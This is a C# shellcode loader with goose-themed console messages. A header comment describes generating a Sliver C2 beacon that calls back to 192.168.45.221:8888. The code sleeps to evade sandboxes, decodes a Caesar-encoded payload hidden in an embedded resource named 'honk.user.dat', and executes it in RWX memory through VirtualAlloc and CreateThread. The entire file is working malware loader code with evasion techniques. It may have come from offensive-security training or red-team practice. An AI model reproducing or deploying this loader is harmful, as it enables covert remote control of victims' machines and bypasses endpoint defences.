using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;


/* 
 * Running local shellcode as an embedded reference with Sliver C2
 * generate --mtls 192.168.45.221:8888 --os windows --arch amd64 --format shellcode --save beacon.bin
 * run that bin file through the encoder https://github.com/0xG00S3/Payload-Encoder
 */

namespace honk
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType,
        UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]

        static extern IntPtr GetCurrentProcess();

        public static void appleBits()
        {
            Console.WriteLine("Here you will learn about gooses!");
            Console.WriteLine("In the digital ponds of cyberspace, the legendary hacker goose is known for its unique ability to \"quack\" through any security system, leaving a trail of digital feathers but never getting caught.");
            holdYourHorses();

            eatTheApple();
        }

        static void holdYourHorses()
        {
            DateTime startTime = DateTime.Now;
            Console.WriteLine("Gooses get tiredz...");

            Sleep(15000);

            DateTime endTime = DateTime.Now;
            TimeSpan duration = endTime - startTime;

            Console.WriteLine($"Gooses woked up after {duration.TotalSeconds} seconds.");

            // Adjust this threshold based on expected variances in timing and execution environments
            if (duration.TotalSeconds < 15)
            {
                Console.WriteLine("Man this beach is so darn sandy :(");
                Environment.Exit(-1);
            }
            else
            {
                Console.WriteLine("Mess with the Honk get the Bonk!");
            }
        }

        public static void eatTheApple()
        {
            try
            {
                byte[] encodedShellcode;
                var assembly = Assembly.GetExecutingAssembly();
                var resourceName = "honk.user.dat"; // Ensure this matches the embedded resource name

                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream == null)
                    {
                        Console.WriteLine("Failed to load embedded resource.");
                        return;
                    }
                    using (BinaryReader reader = new BinaryReader(stream))
                    {
                        encodedShellcode = reader.ReadBytes((int)stream.Length);
                    }
                }

                // Decode the shellcode with Caesar cipher
                byte[] shellcode = new byte[encodedShellcode.Length];
                for (int i = 0; i < encodedShellcode.Length; i++)
                {
                    shellcode[i] = (byte)(((uint)encodedShellcode[i] - 9) & 0xFF); // Adjust the shift value (-9 here) or as per your encoding
                }

                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
                if (addr == IntPtr.Zero)
                {
                    Console.WriteLine("VirtualAlloc failed.");
                    return;
                }
                Marshal.Copy(shellcode, 0, addr, shellcode.Length);

                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                {
                    Console.WriteLine("CreateThread failed.");
                    return;
                }
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }
    }
}
